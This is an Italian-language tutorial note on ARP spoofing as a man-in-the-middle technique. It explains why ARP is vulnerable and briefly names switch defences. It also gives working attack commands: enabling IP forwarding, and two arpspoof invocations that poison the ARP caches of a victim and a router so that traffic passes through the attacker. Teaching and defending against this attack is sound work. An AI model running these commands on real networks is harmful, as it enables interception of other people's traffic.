Questo è l'attacco "Man-in-the-Middle" (MITM) per eccellenza.

**Contenuto:**
```markdown
# 🎭 ARP Spoofing (ARP Poisoning)

Port Security: configurare lo switch per accettare solo un numero limitato di indirizzi MAC su una singola porta.
Sticky MAC: Lo switch memorizza il primo MAC che vede e blocca gli altri.

L'ARP Spoofing permette a un attaccante di intercettare il traffico tra due dispositivi (solitamente un utente e il Gateway/Router).

## 🧠 Il protocollo ARP e la sua debolezza
L'ARP (Address Resolution Protocol) serve a scoprire l'indirizzo MAC conoscendo l'indirizzo IP. 
**Il problema:** L'ARP è "stateless". Un computer accetta una risposta ARP anche se non ha mai inviato una richiesta. Questo permette l'avvelenamento della cache (Poisoning).



## 🛠️ Tool e Comandi: Arpspoof
Per eseguire l'attacco servono solitamente due istanze di `arpspoof` (uno per bersaglio).

### 1. Abilitare l'IP Forwarding
Prima di iniziare, l'attaccante deve permettere al traffico di passare attraverso la propria macchina, altrimenti la vittima perderà la connessione Internet (Denial of Service).
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

# Dì alla Vittima che TU sei il Router
arpspoof -i eth0 -t [IP_VITTIMA] [IP_ROUTER]

# Dì al Router che TU sei la Vittima
arpspoof -i eth0 -t [IP_ROUTER] [IP_VITTIMA]
